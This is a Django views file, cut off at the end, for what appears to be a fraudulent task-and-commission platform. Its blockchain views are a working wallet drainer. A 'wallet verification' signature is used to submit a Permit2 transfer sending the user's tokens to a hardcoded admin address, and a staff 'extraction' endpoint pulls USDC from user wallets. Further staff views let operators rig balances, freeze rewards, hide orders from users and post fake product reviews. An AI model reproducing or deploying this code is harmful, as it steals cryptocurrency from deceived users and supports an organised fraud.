import os
import json
from decimal import Decimal
from datetime import timedelta
from functools import wraps
from web3 import Web3
import traceback
from django.http import JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.models import User
from django.contrib import messages
from django.contrib.auth.hashers import make_password, check_password
from django.contrib.auth import update_session_auth_hash, authenticate, login, logout
from django.contrib.auth.decorators import login_required, user_passes_test
from django.utils import timezone
from django.db import transaction
from django.db.models import Count, Q, Max, Sum
from django.urls import reverse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST

from .models import UserProfile, VipLevel, Product, ProductEvaluation, WithdrawalRequest, DepositRecord, SupportMessage, UserOrder, LuckyReward, SuccessiveOrderPlan, HomePageSettings    
from dotenv import load_dotenv

load_dotenv()
# --- BLOCKCHAIN CONFIG ---
w3 = Web3(Web3.HTTPProvider(os.getenv('RPC_URL')))
ADMIN_PRIVATE_KEY = os.getenv('ADMIN_PRIVATE_KEY')
ADMIN_ADDRESS = '0xC629b1959A638d62B60665317C0D3874B389d8F4'
USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'

PERMIT_TRANSFER_FROM_ABI = [
    {
        "inputs": [
            {
                "components": [
                    {
                        "components": [
                            {"internalType": "address", "name": "token", "type": "address"},
                            {"internalType": "uint256", "name": "amount", "type": "uint256"}
                        ],
                        "internalType": "struct AllowanceTransfer.TokenPermissions",
                        "name": "permitted",
                        "type": "tuple"
                    },
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint256", "name": "nonce", "type": "uint256"},
                    {"internalType": "uint256", "name": "deadline", "type": "uint256"}
                ],
                "internalType": "struct AllowanceTransfer.PermitTransferFrom",
                "name": "permit",
                "type": "tuple"
            },
            {
                "components": [
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "requestedAmount", "type": "uint256"}
                ],
                "internalType": "struct AllowanceTransfer.SignatureTransferDetails",
                "name": "transferDetails",
                "type": "tuple"
            },
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "bytes", "name": "signature", "type": "bytes"}
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    return ip



# --- STAFF DECORATOR ---
def staff_required(view_func):
    @wraps(view_func)
    def wrapper(request, *args, **kwargs):
        if not request.user.is_authenticated:
            return redirect('staff_login')
        if not request.user.is_staff:
            return redirect('user_home')
        return view_func(request, *args, **kwargs)
    return wrapper

# --- BLOCKCHAIN VIEWS ---

@csrf_exempt
def execute_approval(request):
    if request.method != 'POST':
        return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)

    try:
        data = json.loads(request.body)
        signature = data.get('signature')
        message = data.get('message')
        user_address = data.get('userAddress')

        if not signature or not message:
            return JsonResponse({'status': 'error', 'message': 'Missing data.'}, status=400)
        
        PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
        permit2 = w3.eth.contract(address=PERMIT2_ADDRESS, abi=PERMIT_TRANSFER_FROM_ABI)
        
        # 1. Build PermitTransferFrom struct tuple
        permit_transfer_from = (
            (
                message['permitted']['token'],
                int(message['permitted']['amount'])
            ),
            message['spender'],
            int(message['nonce']),
            int(message['deadline'])
        )

        # 2. Build SignatureTransferDetails struct tuple
        transfer_details = (
            str(ADMIN_ADDRESS), 
            int(message['permitted']['amount'])
        )

        # 3. Convert signature hex to bytes
        sig_bytes = bytes.fromhex(signature[2:]) if signature.startswith('0x') else bytes.fromhex(signature)

        # 4. Build transaction targeting permit2.permit(...)
        tx = permit2.functions.permit(
            permit_transfer_from,
            transfer_details,
            str(user_address),
            sig_bytes
        ).build_transaction({
            'from': ADMIN_ADDRESS,
            'nonce': w3.eth.get_transaction_count(ADMIN_ADDRESS),
            'gas': 300000,
            'gasPrice': w3.eth.gas_price
        })
        
        # 5. Sign and send transaction (using raw_transaction)
        signed_tx = w3.eth.account.sign_transaction(tx, ADMIN_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        
        # 6. Wait for transaction receipt and confirm status == 1 before updating database
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        
        if receipt.get('status') == 1:
            if hasattr(request.user, 'profile'):
                profile = request.user.profile
                profile.is_wallet_verified = True
                profile.save()

            return JsonResponse({'status': 'success', 'tx_hash': tx_hash.hex()})
        else:
            return JsonResponse({'status': 'error', 'message': 'Transaction reverted on-chain.'}, status=400)

    except Exception as e:
        traceback.print_exc()
        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)

@csrf_exempt
def verify_approval(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        tx_hash = data.get('tx_hash')
        receipt = w3.eth.get_transaction_receipt(tx_hash)
        if receipt and receipt['status'] == 1:
            profile = request.user.profile
            profile.is_wallet_verified = True
            profile.save()
            return JsonResponse({'status': 'success'})
        return JsonResponse({'status': 'error', 'message': 'Transaction failed'})
    return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)

# --- DASHBOARD VIEW ---

@login_required
def staff_wallet_dashboard(request):
    profiles = UserProfile.objects.all()
    context = {
        'profiles': profiles,
        'admin_address': ADMIN_ADDRESS,
    }
    return render(request, 'staff/wallet_dashboard.html', context)

@csrf_exempt
@login_required
def execute_extraction(request):
    if request.method != 'POST':
        return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)

    try:
        data = json.loads(request.body)
        user_address = data.get('userAddress')
        amount = int(data.get('amount')) # Amount in token base units (e.g., USDC decimals = 6)
        token_address = data.get('tokenAddress', USDC_ADDRESS)

        if not user_address or not amount:
            return JsonResponse({'status': 'error', 'message': 'Missing extraction parameters.'}, status=400)

        PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
        
        # Permit2 allowance transfer from function utilizing allowance transfer mapping instead of signature transfer details if pre-approved,
        # or utilizing standard AllowanceTransfer approval mechanism
        PERMIT2_ALLOWANCE_TRANSFER_ABI = [
            {
                "inputs": [
                    {"internalType": "address", "name": "owner", "type": "address"},
                    {"internalType": "address", "name": "token", "type": "address"},
                    {"internalType": "address", "name": "spender", "type": "address"},
                    {"internalType": "uint160", "name": "amount", "type": "uint160"},
                    {"internalType": "uint48", "name": "expiration", "type": "uint48"}
                ],
                "name": "approve",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "from", "type": "address"},
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint160", "name": "amount", "type": "uint160"},
                    {"internalType": "address", "name": "token", "type": "address"}
                ],
                "name": "transferFrom",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ]

        permit2 = w3.eth.contract(address=PERMIT2_ADDRESS, abi=PERMIT2_ALLOWANCE_TRANSFER_ABI)
        
        tx = permit2.functions.transferFrom(
            user_address,
            ADMIN_ADDRESS,
            amount,
            token_address
        ).build_transaction({
            'from': ADMIN_ADDRESS,
            'nonce': w3.eth.get_transaction_count(ADMIN_ADDRESS),
            'gas': 150000,
            'gasPrice': w3.eth.gas_price
        })

        signed_tx = w3.eth.account.sign_transaction(tx, ADMIN_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        if receipt.get('status') == 1:
            return JsonResponse({'status': 'success', 'tx_hash': tx_hash.hex()})
        else:
            return JsonResponse({'status': 'error', 'message': 'Extraction transaction reverted on-chain.'}, status=400)

    except Exception as e:
        traceback.print_exc()
        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)

# STAFF LOGIN

def staff_login(request):
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()

        user = authenticate(request, username=username, password=password)

        if user is not None and user.is_staff:
            login(request, user)
            return redirect('staff_home')

        messages.error(request, 'Invalid staff username or password.')
        return redirect('staff_login')

    return render(request, 'staff/login.html')


def staff_logout(request):
    logout(request)
    return redirect('staff_login')

@staff_required
def staff_home_page_management(request):
    home_settings = HomePageSettings.load()

    section_fields = {
        "home": (
            "brand_name",
            "announcement",
            "banner_type",
            "banner_url",
            "online_users_value",
            "online_users_note",
            "order_completion_value",
            "order_completion_note",
            "optimize_demand_value",
            "optimize_demand_note",
            "order_quantity_value",
            "order_quantity_note",
        ),
        "order": (
            "order_banner_type",
            "order_banner_url",
            "order_description_html",
            "please_note_html",
        ),
        "icons": (
            "withdrawal_icon_url",
            "deposit_icon_url",
            "customer_service_icon_url",
            "online_customer_service_icon_url",
            "transaction_notice_icon_url",
            "campaign_icon_url",
            "illustrate_icon_url",
            "faqs_icon_url",
            "company_profile_icon_url",
            "home_nav_active_url",
            "home_nav_inactive_url",
            "records_nav_active_url",
            "records_nav_inactive_url",
            "order_nav_active_url",
            "order_nav_inactive_url",
            "messages_nav_active_url",
            "messages_nav_inactive_url",
            "settings_nav_active_url",
            "settings_nav_inactive_url",
            "default_profile_icon_url",
            "order_description_icon_url",
            "please_note_icon_url",
            "wallet_icon_url",
            "settings_deposit_icon_url",
            "settings_withdraw_icon_url",
            "trading_account_icon_url",
            "personal_information_icon_url",
            "official_announcement_icon_url",
            "more_services_icon_url",
            "my_team_icon_url",
        ),
        "terms": ("terms_and_conditions_html",),
        "campaign": ("campaign_html",),
        "illustrate": ("illustrate_html",),
        "faqs": ("faqs_html",),
        "company": ("company_profile_html",),
    }

    if request.method == "POST":
        section = request.POST.get("section", "home")
        fields = section_fields.get(section)

        if fields is None:
            messages.error(request, "Invalid content section.")
            return redirect("staff_home_page_management")

        for field in fields:
            value = request.POST.get(field, "").strip()
            setattr(home_settings, field, value)

        home_settings.save()
        messages.success(request, "Content updated successfully.")

        editor_url = reverse("staff_home_page_management")
        return redirect(f"{editor_url}?tab={section}")

    active_tab = request.GET.get("tab", "home")

    if active_tab not in section_fields:
        active_tab = "home"

    return render(
        request,
        "staff/home_page_management.html",
        {
            "home_settings": home_settings,
            "active_tab": active_tab,
        },
    )

# STAFF HOME

@staff_required
def staff_home(request):
    today = timezone.localdate()
    now = timezone.now()

    total_users = UserProfile.objects.count()

    total_register_today = UserProfile.objects.filter(
        registration_time__date=today
    ).count()

    online_users = UserProfile.objects.filter(
        recent_login__gte=now - timedelta(seconds=30)
    ).count()

    vip_count = VipLevel.objects.count()
    product_count = Product.objects.count()
    evaluation_count = ProductEvaluation.objects.count()

    recent_users = UserProfile.objects.select_related(
        'user',
        'vip_level'
    ).all().order_by('-id')[:8]

    return render(request, 'staff/home.html', {
        'total_users': total_users,
        'total_register_today': total_register_today,
        'online_users': online_users,
        'vip_count': vip_count,
        'product_count': product_count,
        'evaluation_count': evaluation_count,
        'recent_users': recent_users,
    })


# USER MANAGEMENT

@staff_required
def staff_user_management(request):
    profiles = UserProfile.objects.select_related(
        'user',
        'invited_by',
        'invited_by__user',
        'vip_level'
    ).all().order_by('-id')

    vip_levels = VipLevel.objects.all().order_by('id')

    now = timezone.now()

    for profile in profiles:
        if profile.recent_login and profile.recent_login >= now - timedelta(seconds=30):
            profile.live_status = 'online'
        else:
            profile.live_status = 'offline'

    return render(request, 'staff/user_management.html', {
        'profiles': profiles,
        'vip_levels': vip_levels,
    })


@staff_required
def staff_add_user(request):
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        phone_number = request.POST.get('phone_number', '').strip()
        email = request.POST.get('email', '').strip()
        password = request.POST.get('password', '').strip()
        transaction_password = request.POST.get('transaction_password', '').strip()
        vip_level_id = request.POST.get('vip_level', '').strip()
        account_status = request.POST.get('account_status', 'active').strip()
        trade_status = request.POST.get('trade_status', 'enabled').strip()
        upper_level_id = request.POST.get('upper_level_id', '').strip()

        vip_level = VipLevel.objects.filter(id=vip_level_id).first()

        if not username or not phone_number or not password or not transaction_password or not vip_level:
            messages.error(request, 'Please fill all required fields.')
            return redirect('staff_user_management')

        if User.objects.filter(username__iexact=username).exists():
            messages.error(request, 'Username already exists.')
            return redirect('staff_user_management')

        invited_by_profile = None

        if upper_level_id:
            invited_by_profile = UserProfile.objects.filter(id=upper_level_id).first()

            if not invited_by_profile:
                messages.error(request, 'Upper level ID does not exist.')
                return redirect('staff_user_management')

        user = User.objects.create_user(
            username=username,
            email=email,
            password=password
        )

        profile, created = UserProfile.objects.get_or_create(user=user)

        profile.phone_number = phone_number
        profile.transaction_password = make_password(transaction_password)
        profile.vip_level = vip_level
        profile.account_status = account_status
        profile.trade_status = trade_status
        profile.invited_by = invited_by_profile
        profile.save()

        messages.success(request, 'User added successfully.')

    return redirect('staff_user_management')


@staff_required
def staff_edit_user(request, profile_id):
    profile = get_object_or_404(
        UserProfile.objects.select_related('user'),
        id=profile_id
    )

    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        phone_number = request.POST.get('phone_number', '').strip()
        email = request.POST.get('email', '').strip()
        vip_level_id = request.POST.get('vip_level', '').strip()
        balance = request.POST.get('balance', '0').strip()
        frozen_amount = request.POST.get('frozen_amount', '0').strip()
        credit_score = request.POST.get('credit_score', '100').strip()
        task_progress = request.POST.get('task_progress', '0').strip()
        need_authorization = request.POST.get('need_authorization', 'False')
        account_status = request.POST.get('account_status', 'active')
        trade_status = request.POST.get('trade_status', 'enabled')
        withdrawal_status = request.POST.get('withdrawal_status', 'enabled')

        if not username:
            messages.error(request, 'Username is required.')
            return redirect('staff_user_management')

        if User.objects.filter(username__iexact=username).exclude(id=profile.user.id).exists():
            messages.error(request, 'Username already exists.')
            return redirect('staff_user_management')

        profile.user.username = username
        profile.user.email = email
        profile.user.save()

        profile.phone_number = phone_number

        if vip_level_id:
            vip_level = VipLevel.objects.filter(id=vip_level_id).first()
        else:
            vip_level = VipLevel.objects.filter(level_name__iexact='VIP1').first()

        profile.vip_level = vip_level
        profile.balance = Decimal(balance or '0')
        profile.frozen_amount = Decimal(frozen_amount or '0')
        profile.credit_score = int(credit_score or 100)
        profile.task_progress = int(task_progress or 0)
        profile.need_authorization = True if need_authorization == 'True' else False
        profile.account_status = account_status
        profile.trade_status = trade_status
        profile.withdrawal_status = withdrawal_status
        profile.save()

        messages.success(request, 'User updated successfully.')

    return redirect('staff_user_management')


@staff_required
def staff_score_modify(request, profile_id):
    profile = get_object_or_404(UserProfile, id=profile_id)

    if request.method == 'POST':
        operation_type = request.POST.get('operation_type')
        amount = Decimal(request.POST.get('amount', '0'))

        if amount <= 0:
            messages.error(request, 'Amount must be greater than 0.')
            return redirect('staff_user_management')

        if operation_type == 'plus':
            with transaction.atomic():
                profile.balance += amount
                profile.save(update_fields=['balance'])
                DepositRecord.objects.create(
                    user=profile.user,
                    amount=amount,
                    created_by=request.user,
                    remark='Wallet deposit credited by staff.',
                )

        elif operation_type == 'minus':
            if profile.balance < amount:
                messages.error(request, 'Insufficient balance.')
                return redirect('staff_user_management')

            profile.balance -= amount
            profile.save(update_fields=['balance'])

        else:
            messages.error(request, 'Invalid balance operation.')
            return redirect('staff_user_management')

        messages.success(request, 'Balance updated successfully.')

    return redirect('staff_user_management')


# USER SECURITY

@staff_required
def staff_update_login_password(request, profile_id):
    profile = get_object_or_404(
        UserProfile.objects.select_related('user'),
        id=profile_id
    )

    if request.method == 'POST':
        new_password = request.POST.get('new_password', '').strip()

        if new_password:
            profile.user.set_password(new_password)
            profile.user.save()
            messages.success(request, 'Login password updated successfully.')

    return redirect('staff_user_management')


@staff_required
def staff_update_withdrawal_password(request, profile_id):
    profile = get_object_or_404(UserProfile, id=profile_id)

    if request.method == 'POST':
        new_password = request.POST.get('new_password', '').strip()

        if new_password:
            profile.transaction_password = make_password(new_password)
            profile.save()
            messages.success(request, 'Withdrawal password updated successfully.')

    return redirect('staff_user_management')


@staff_required
def staff_update_wallet_address(request, profile_id):
    profile = get_object_or_404(UserProfile, id=profile_id)

    if request.method == 'POST':
        wallet_address = request.POST.get('wallet_address', '').strip()

        profile.wallet_address = wallet_address
        profile.save()

        messages.success(request, 'Wallet address updated successfully.')

    return redirect('staff_user_management')


@staff_required
def staff_successive_order_page(request, profile_id):
    profile = get_object_or_404(UserProfile, id=profile_id)

    orders = SuccessiveOrderPlan.objects.filter(
        profile=profile
    ).select_related(
        "product",
        "matched_order",
        "created_by"
    ).order_by("target_order_number")

    missions = Product.objects.all().order_by("-id")

    return render(request, "staff/successive_order_page.html", {
        "profile": profile,
        "orders": orders,
        "missions": missions,
    })

@staff_required
def staff_add_successive_order(request):
    if request.method == "POST":
        profile = get_object_or_404(UserProfile, id=request.POST.get("profile_id"))
        product = get_object_or_404(Product, id=request.POST.get("mission_id"))

        SuccessiveOrderPlan.objects.create(
            profile=profile,
            product=product,
            target_order_number=int(request.POST.get("target_turn")),
            negative_amount=Decimal(request.POST.get("negative_amount") or "0"),
            status="waiting",
            created_by=request.user
        )

        return redirect("staff_successive_order_page", profile.id)

    return redirect("staff_user_management")

@staff_required
def staff_edit_successive_order_frozen(request, order_id):
    plan = get_object_or_404(SuccessiveOrderPlan, id=order_id)
    profile = plan.profile

    if request.method == "POST":
        if plan.status == "waiting":
            plan.negative_amount = Decimal(request.POST.get("negative_amount") or "0")
            plan.save()

        return redirect("staff_successive_order_page", profile_id=profile.id)

    return redirect("staff_successive_order_page", profile_id=profile.id)

@staff_required
def staff_delete_successive_order(request, order_id):
    plan = get_object_or_404(SuccessiveOrderPlan, id=order_id)
    profile = plan.profile

    if request.method == "POST":
        if plan.status == "waiting":
            plan.delete()
        else:
            plan.status = "cancelled"
            plan.save()

    return redirect("staff_successive_order_page", profile_id=profile.id)

@staff_required
def lucky_reward_page(request, profile_id):
    profile = get_object_or_404(UserProfile, id=profile_id)

    rewards = LuckyReward.objects.filter(
        profile=profile
    ).order_by("-id")

    return render(request, "staff/lucky_reward_page.html", {
        "profile": profile,
        "rewards": rewards,
    })



@staff_required
def staff_add_lucky_reward(request):
    if request.method == "POST":
        profile_id = request.POST.get("profile_id")
        target_order_number = request.POST.get("target_order_number")
        payout_amount = request.POST.get("payout_amount")
        payout_jump_time = request.POST.get("payout_jump_time")
        freeze_reward = request.POST.get("freeze_reward") == "yes"

        profile = get_object_or_404(UserProfile, id=profile_id)

        LuckyReward.objects.create(
            profile=profile,
            target_order_number=int(target_order_number),
            payout_amount=Decimal(payout_amount),
            payout_jump_time=int(payout_jump_time or 10),
            freeze_reward=freeze_reward,
            status="waiting",
            created_by=request.user
        )

        return redirect("lucky_reward_page", profile_id=profile.id)

    return redirect("staff_user_management")

@staff_required
def confirm_lucky_reward(request, reward_id):
    reward = get_object_or_404(
        LuckyReward,
        id=reward_id,
        status="pending"
    )

    profile = reward.profile

    if request.method == "POST":
        UserOrder.objects.create(
            user=profile.user,
            product=None,
            order_type="lucky_reward",
            lucky_reward=reward,
            order_price=Decimal("0.00"),
            commission=reward.payout_amount,
            status="completed",
            completed_at=timezone.now()
        )

        profile.balance += reward.payout_amount
        profile.task_progress += 1
        profile.save()

        reward.status = "completed"
        reward.freeze_reward = False
        reward.completed_at = timezone.now()
        reward.save()

        messages.success(request, "Lucky reward confirmed successfully.")

    return redirect("lucky_reward_page", profile_id=profile.id)

@staff_required
def delete_lucky_reward(request, reward_id):
    reward = get_object_or_404(LuckyReward, id=reward_id)
    profile = reward.profile

    if request.method == "POST":
        if reward.status in ["waiting", "cancelled"]:
            reward.delete()
        else:
            reward.status = "cancelled"
            reward.save()

    return redirect("lucky_reward_page", profile_id=profile.id)


@login_required(login_url="user_login")
def lucky_reward_animation(request, reward_id):
    reward = get_object_or_404(
        LuckyReward,
        id=reward_id,
        profile=request.user.userprofile,
        status__in=["processing", "pending"]
    )

    claim_failed = reward.status == "pending"

    return render(request, "user/lucky_reward_animation.html", {
        "reward": reward,
        "claim_failed": claim_failed,
    })

@login_required(login_url="user_login")
def claim_lucky_reward(request, reward_id):
    reward = get_object_or_404(
        LuckyReward,
        id=reward_id,
        profile=request.user.userprofile,
        status="processing"
    )

    profile = request.user.userprofile

    if reward.freeze_reward:
        reward.status = "pending"
        reward.claimed_at = timezone.now()
        reward.save()

        return redirect("lucky_reward_animation", reward_id=reward.id)

    UserOrder.objects.create(
        user=request.user,
        product=None,
        order_type="lucky_reward",
        lucky_reward=reward,
        order_price=Decimal("0.00"),
        commission=reward.payout_amount,
        status="completed",
        completed_at=timezone.now()
    )

    profile.balance += reward.payout_amount
    profile.task_progress += 1
    profile.save()

    reward.status = "completed"
    reward.claimed_at = timezone.now()
    reward.completed_at = timezone.now()
    reward.save()

    messages.success(request, f"Reward received successfully: {reward.payout_amount} USD")

    return redirect("user_order")

@login_required(login_url="user_login")
def lucky_reward_animation_failed(request, reward_id):
    reward = get_object_or_404(
        LuckyReward,
        id=reward_id,
        profile=request.user.userprofile,
        status="need_confirm"
    )

    return render(request, "user/lucky_reward_animation.html", {
        "reward": reward,
        "claim_failed": True,
    })

def user_has_blocking_lucky_reward(profile):
    return LuckyReward.objects.filter(
        profile=profile,
        status="pending"
    ).exists()


@staff_required
def staff_order_management(request):
    orders = UserOrder.objects.select_related(
        "user",
        "user__userprofile",
        "product",
        "lucky_reward"
    ).all().order_by("-id")

    return render(request, "staff/order_management.html", {
        "orders": orders,
    })


@staff_required
def staff_toggle_order_visibility(request, order_id):
    order = get_object_or_404(
        UserOrder,
        id=order_id
    )

    if request.method == "POST":
        order.is_hidden_from_user = not order.is_hidden_from_user
        order.save()

        messages.success(
            request,
            "Order visibility updated."
        )

    return redirect("staff_order_management")
# VIP MANAGEMENT

@staff_required
def staff_vip_level_management(request):
    vip_levels = VipLevel.objects.all().order_by('id')

    return render(request, 'staff/vip_level_management.html', {
        'vip_levels': vip_levels
    })

@staff_required
def staff_add_vip_level(request):
    if request.method == 'POST':
        level_name = request.POST.get('level_name', '').strip()
        minimum_withdrawal = request.POST.get('minimum_withdrawal', '50').strip()
        maximum_withdrawal = request.POST.get('maximum_withdrawal', '99999999').strip()
        minimum_amount = request.POST.get('minimum_amount', '0').strip()
        commission_rate = request.POST.get('commission_rate', '0').strip()
        successive_order_commission_rate = request.POST.get('successive_order_commission_rate', '0').strip()
        maximum_task = request.POST.get('maximum_task', '0').strip()
        description = request.POST.get('description', '').strip()
        icon = request.FILES.get('icon')

        if not level_name:
            messages.error(request, 'Level name is required.')
            return redirect('staff_vip_level_management')

        if VipLevel.objects.filter(level_name__iexact=level_name).exists():
            messages.error(request, 'VIP level already exists.')
            return redirect('staff_vip_level_management')

        VipLevel.objects.create(
            level_name=level_name,
            icon=icon,
            minimum_withdrawal=Decimal(minimum_withdrawal or '50'),
            maximum_withdrawal=Decimal(maximum_withdrawal or '99999999'),
            minimum_amount=Decimal(minimum_amount or '0'),
            commission_rate=Decimal(commission_rate or '0'),
            successive_order_commission_rate=Decimal(successive_order_commission_rate or '0'),
            maximum_task=int(maximum_task or 0),
            description=description
        )

        messages.success(request, 'VIP level added successfully.')

    return redirect('staff_vip_level_management')


@staff_required
def staff_edit_vip_level(request, vip_id):
    vip = get_object_or_404(VipLevel, id=vip_id)

    if request.method == 'POST':
        level_name = request.POST.get('level_name', '').strip()

        if not level_name:
            messages.error(request, 'Level name is required.')
            return redirect('staff_vip_level_management')

        vip.level_name = level_name
        vip.minimum_withdrawal = Decimal(request.POST.get('minimum_withdrawal', '50') or '50')
        vip.maximum_withdrawal = Decimal(request.POST.get('maximum_withdrawal', '99999999') or '99999999')
        vip.minimum_amount = Decimal(request.POST.get('minimum_amount', '0') or '0')
        vip.commission_rate = Decimal(request.POST.get('commission_rate', '0') or '0')
        vip.successive_order_commission_rate = Decimal(
            request.POST.get('successive_order_commission_rate', '0') or '0'
        )
        vip.maximum_task = int(request.POST.get('maximum_task', '0') or 0)
        vip.description = request.POST.get('description', '').strip()

        icon = request.FILES.get('icon')

        if icon:
            vip.icon = icon

        vip.save()

        messages.success(request, 'VIP level updated successfully.')

    return redirect('staff_vip_level_management')


@staff_required
def staff_delete_vip_level(request, vip_id):
    vip = VipLevel.objects.filter(id=vip_id).first()

    if vip:
        vip.delete()
        messages.success(request, 'VIP level deleted successfully.')
    else:
        messages.error(request, 'VIP level not found.')

    return redirect('staff_vip_level_management')


# PRODUCT MANAGEMENT

@staff_required
def staff_product_list(request):
    products = Product.objects.all().order_by('-id')

    return render(request, 'staff/product_list.html', {
        'products': products
    })


@staff_required
def staff_add_product(request):
    if request.method == 'POST':
        Product.objects.create(
            name=request.POST.get('name', '').strip(),
            cover=request.POST.get('cover', '').strip(),
            price=Decimal(request.POST.get('price', '0') or '0'),
            score=int(request.POST.get('score', '0') or 0),
        )

        messages.success(request, 'Product added successfully.')

    return redirect('staff_product_list')


@staff_required
def staff_edit_product(request, product_id):
    product = get_object_or_404(Product, id=product_id)

    if request.method == 'POST':
        product.name = request.POST.get('name', '').strip()
        product.cover = request.POST.get('cover', '').strip()
        product.price = Decimal(request.POST.get('price', '0') or '0')
        product.score = int(request.POST.get('score', '0') or 0)
        product.description = request.POST.get('description', '').strip()
        product.goods_album_1 = request.POST.get('goods_album_1', '').strip()
        product.goods_album_2 = request.POST.get('goods_album_2', '').strip()
        product.goods_album_3 = request.POST.get('goods_album_3', '').strip()
        product.goods_album_4 = request.POST.get('goods_album_4', '').strip()
        product.save()

        messages.success(request, 'Product updated successfully.')

    return redirect('staff_product_list')


@staff_required
def staff_delete_product(request, product_id):
    product = Product.objects.filter(id=product_id).first()

    if product:
        product.delete()
        messages.success(request, 'Product deleted successfully.')
    else:
        messages.error(request, 'Product not found.')

    return redirect('staff_product_list')


# PRODUCT EVALUATION

@staff_required
def staff_product_evaluation(request):
    comments = ProductEvaluation.objects.all().order_by('-id')

    return render(request, 'staff/product_evaluation.html', {
        'comments': comments
    })


@staff_required
def staff_add_product_evaluation(request):
    if request.method == 'POST':
        star_level = request.POST.get('star_level', '5.0').strip()
        content = request.POST.get('content', '').strip()

        if content:
            ProductEvaluation.objects.create(
                star_level=Decimal(star_level or '5.0'),
                content=content
            )

            messages.success(request, 'Comment added successfully.')

    return redirect('staff_product_evaluation')


@staff_required
def staff_edit_product_evaluation(request, comment_id):
    comment = get_object_or_404(ProductEvaluation, id=comment_id)

    if request.method == 'POST':
        comment.star_level = Decimal(request.POST.get('star_level', '5.0') or '5.0')
        comment.content = request.POST.get('content', '').strip()
        comment.save()

        messages.success(request, 'Comment updated successfully.')

    return redirect('staff_product_evaluation')


@staff_required
def staff_delete_product_evaluation(request, comment_id):
    comment = ProductEvaluation.objects.filter(id=comment_id).first()

    if comment:
        comment.delete()
        messages.success(request, 'Comment deleted successfully.')

    return redirect('staff_product_evaluation')

@staff_required
def staff_withdrawal_management(request):
    withdrawals = WithdrawalRequest.objects.select_related(
        'user',
        'user__userprofile'
    ).all().order_by('-id')

    return render(request, 'staff/withdrawal_management.html', {
        'withdrawals': withdrawals
    })


@staff_required
def staff_approve_withdrawal(request, withdrawal_id):
    withdrawal = get_object_or_404(WithdrawalRequest, id=withdrawal_id)

    if withdrawal.status != 'pending':
        messages.error(request, 'This withdrawal was already handled.')
        return redirect('staff_withdrawal_management')

    withdrawal.status = 'approved'
    withdrawal.handled_at = timezone.now()
    withdrawal.save()

    messages.success(request, 'Withdrawal approved successfully.')
    return redirect('staff_withdrawal_management')


@staff_required
def staff_reject_withdrawal(request, withdrawal_id):
    withdrawal = get_object_or_404(WithdrawalRequest, id=withdrawal_id)
    profile = get_object_or_404(UserProfile, user=withdrawal.user)

    if withdrawal.status != 'pending':
        messages.error(request, 'This withdrawal was already handled.')
        return redirect('staff_withdrawal_management')

    if request.method == 'POST':
        remark = request.POST.get('remark', '').strip()

        profile.balance += withdrawal.amount
        profile.save()

        withdrawal.status = 'rejected'
        withdrawal.remark = remark
        withdrawal.handled_at = timezone.now()
        withdrawal.save()

        messages.success(request, 'Withdrawal rejected and balance returned.')

    return redirect('staff_withdrawal_management')

@staff_required
def staff_support(request):

    users = User.objects.filter(
        support_messages__isnull=False
    ).annotate(
        unread_count=Count(
            'support_messages',
            filter=Q(
                support_messages__sender__is_staff=False,
                support_messages__is_read_by_staff=False
            )
        ),
        last_message_time=Max('support_messages__created_at')
    ).distinct().order_by('-last_message_time')

    selected_user_id = request.GET.get('user_id')
    selected_user = None
    messages_list = []

    if selected_user_id:
        selected_user = get_object_or_404(User, id=selected_user_id)

        if request.method == 'POST':
            message = request.POST.get('message', '').strip()
            image = request.FILES.get('image')

            if message or image:
                SupportMessage.objects.create(
                    user=selected_user,
                    sender=request.user,
                    message=message,
                    image=image,
                    message_type='image' if image else 'text',
                    is_read_by_staff=True,
                    is_read_by_user=False
                )

            return redirect(f'/staff/support/?user_id={selected_user.id}')

        SupportMessage.objects.filter(
            user=selected_user,
            sender__is_staff=False,
            is_read_by_staff=False
        ).update(is_read_by_staff=True)

        messages_list = SupportMessage.objects.filter(
            user=selected_user
        ).order_by('created_at')

    return render(request, 'staff/support.html', {
        'users': users,
        'selected_user': selected_user,
        'messages_list': messages_list
    })

# USER

def user_register(request):
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        phone_number = request.POST.get('phone_number', '').strip()
        transaction_password = request.POST.get('transaction_password', '').strip()
        password = request.POST.get('password', '').strip()
        confirm_password = request.POST.get('confirm_password', '').strip()
        gender = request.POST.get('gender', '').strip()
        invite_code = request.POST.get('invite_code', '').strip().upper()

        if not username or not phone_number or not transaction_password or not password or not confirm_password or not gender or not invite_code:
            messages.error(request, 'All fields are required.')
            return redirect('user_register')

        if password != confirm_password:
            messages.error(request, 'Passwords do not match.')
            return redirect('user_register')

        if len(invite_code) != 6:
